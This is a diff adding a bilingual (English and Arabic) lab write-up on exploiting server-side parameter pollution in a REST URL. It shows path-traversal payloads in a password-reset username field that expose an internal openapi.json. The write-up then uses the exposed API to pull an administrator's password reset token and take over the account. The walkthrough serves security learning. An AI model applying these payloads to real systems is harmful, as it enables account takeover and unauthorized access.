@@ -990,6 +990,7 @@ administrator : 123
 <img width="1237" height="545" alt="image" src="https://github.com/user-attachments/assets/0daf5a7b-a6db-41a6-a426-3f259a74e361" />
 
 
+
      
 </details>
 
@@ -1000,7 +1001,205 @@ administrator : 123
 
 
 
+<details>
+     <summary>Lab: Exploiting server-side parameter pollution in a REST URL</summary>
 
+
+
+## try to reset password for user **`wiener`**
+
+<img width="1177" height="402" alt="image" src="https://github.com/user-attachments/assets/31899866-d1d4-4327-91e8-c0df6ae3255c" />
+
+
+## but we know that there is user called **`administrator`**
+
+<img width="1272" height="347" alt="image" src="https://github.com/user-attachments/assets/30f29c6c-d34d-4de8-8401-fea9da7ca774" />
+
+
+
+## note that there is **`/static/js/forgotPassword.js`** 
+
+<img width="1024" height="581" alt="image" src="https://github.com/user-attachments/assets/e6cc63df-ff55-432a-a08f-ed35a8329b5d" />
+
+
+```
+passwordResetToken
+```
+
+
+> ## now go back to **`reset-passowrd`** request
+> - try to inject **`#`** ,**`?`**
+
+<img width="1397" height="469" alt="image" src="https://github.com/user-attachments/assets/ee49a51e-497d-464c-8aad-a9e8d5fb9f32" />
+
+```json
+{
+  "type": "error",
+  "result": "Invalid route. Please refer to the API definition"
+}
+```
+
+> ## tell us that path is wrong so what if we try **`path traversal`**
+
+```url
+csrf=RMb3Ojh0eGcZTHwGXwi2wdfAMovtI3mi&username=../../../../../../../administrator?
+```
+
+## **`response`**
+
+```json
+{
+  "error": "Unexpected response from API server:\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Not Found<\/title>\n<\/head>\n<body>\n    <h1>Not found<\/h1>\n    <p>The URL that you requested was not found.<\/p>\n<\/body>\n<\/html>\n"
+}
+```
+
+> ## ohh found another error 
+
+> ## lets try to know endpoints using **`openapi.json`**
+
+
+- <details>
+      <summary>what is openapi.json</summary>
+     
+     # Understanding `openapi.json` and Its Role in Attacks
+     
+     ## 1. ما هو `openapi.json`
+     - ملف **`openapi.json`** هو **ملف توثيق للـ API** مكتوب بصيغة **JSON**.
+     - يتبع **OpenAPI Specification (OAS)**، وهي مواصفة عالمية لتوثيق واجهات البرمجة (APIs).
+     - الهدف منه:
+       - شرح **Endpoints** (المسارات) المتاحة في الـ API.
+       - توضيح **HTTP methods** المدعومة مثل: GET, POST, DELETE.
+       - تحديد **الـ Parameters** المطلوبة مثل query params, body, headers.
+       - عرض أنواع البيانات التي يرجعها الـ API.
+     
+     ### مثال على محتوى `openapi.json`
+     ```json
+     {
+       "openapi": "3.0.0",
+       "info": {
+         "title": "Library API",
+         "version": "1.0.0"
+       },
+       "paths": {
+         "/api/books": {
+           "get": {
+             "summary": "Get all books",
+             "responses": {
+               "200": {
+                 "description": "A list of books"
+               }
+             }
+           },
+           "post": {
+             "summary": "Add a new book",
+             "responses": {
+               "201": {
+                 "description": "Book created successfully"
+               }
+             }
+           }
+         }
+       }
+     }
+     ```
+     
+     ### الفائدة للمهاجم:
+     - معرفة كل **المسارات السرية** في الـ API.
+     - تحديد **المعاملات (parameters)** المطلوبة لكل endpoint.
+     - معرفة **أنواع الطلبات** التي يدعمها كل endpoint.
+     - هذا يوفر الكثير من وقت **Reconnaissance** وكأنك حصلت على كود المصدر الخاص بالـ API.
+     
+     ---
+     
+     ## 2. ليه كتبنا `openapi.json` في الـ Payload
+     الـ Payload المستخدم:
+     ```
+     csrf=RMb3Ojh0eGcZTHwGXwi2wdfAMovtI3mi&username=../../../../../../../openapi.json?
+     ```
+     
+     ### الشرح:
+     1. **`../../../../../../../`**
+        -  **Path Traversal / Directory Traversal**.
+        - الهدف منه الخروج من المجلد الحالي خطوة بخطوة حتى تصل إلى الجذر (`/`) في النظام.
+        - بعد ذلك تحاول الوصول إلى ملف حساس مثل `openapi.json`.
+     
+     2. **`openapi.json`**
+        - يمثل ملف توثيق الـ API.
+        - استهدافه يمنحك رؤية كاملة لجميع الـ endpoints.
+     
+     ---
+     
+     ## 3. الهدف من الهجوم
+     - محاولة **قراءة ملف التوثيق الداخلي** الخاص بالـ API.
+     - إذا نجحت في الوصول إليه:
+       - ستعرف **المسارات المخفية**.
+       - ستكشف **المعاملات الحساسة** التي قد تستغلها.
+       - ستتمكن من تحديد الثغرات مثل:
+         - **IDOR (Insecure Direct Object Reference)**
+         - **Privilege Escalation**
+         - **SQL Injection**
+         - **Mass Assignment**
+     
+     ---
+     
+     
+
+  </details>
+
+> # Don't forget **`?`**
+
+```url
+csrf=RMb3Ojh0eGcZTHwGXwi2wdfAMovtI3mi&username=../../../../../../../openapi.json?
+```
+
+## `response`
+
+
+```json
+{
+  "error": "Unexpected response from API server:\n{\n  \"openapi\": \"3.0.0\",\n  \"info\": {\n    \"title\": \"User API\",\n    \"version\": \"2.0.0\"\n  },\n  \"paths\": {\n    \"/api/internal/v1/users/{username}/field/{field}\": {\n      \"get\": {\n        \"tags\": [\n          \"users\"\n        ],\n        \"summary\": \"Find user by username\",\n        \"description\": \"API Version 1\",\n        \"parameters\": [\n          {\n            \"name\": \"username\",\n            \"in\": \"path\",\n            \"description\": \"Username\",\n            \"required\": true,\n            \"schema\": {\n        ..."
+}
+```
+
+> ## we found that path
+
+```url
+/api/internal/v1/users/{username}/field/{field}
+```
+
+> ## let's try it with :
+> - username : `administrator`
+> - field : `email` , `username` , `password`
+
+<img width="1329" height="418" alt="image" src="https://github.com/user-attachments/assets/47218c7c-ebd1-46d5-a767-0d086f9e769f" />
+
+<img width="1144" height="439" alt="image" src="https://github.com/user-attachments/assets/f585aefd-1f24-4ad0-a874-32d9beca3900" />
+
+<img width="1404" height="460" alt="image" src="https://github.com/user-attachments/assets/dda97963-95f3-415e-9db8-4417d6a04ef6" />
+
+
+> ## now let's try **`passwordResetToken`** that we need
+
+<img width="1249" height="506" alt="image" src="https://github.com/user-attachments/assets/1519289f-4c12-4735-ac3a-b5fb5bdedbd5" />
+
+
+```
+yummwyxyh4cibvzdp5g92ctc95a4obz5
+```
+
+> ## now reset password and login and remove carlos
+
+
+````
+/forgot-password?passwordResetToken=yummwyxyh4cibvzdp5g92ctc95a4obz5
+````
+
+<img width="1261" height="554" alt="image" src="https://github.com/user-attachments/assets/4edb02d7-d126-478c-87a6-6ace498ccab1" />
+
+
+
+     
+</details>
 
 
 
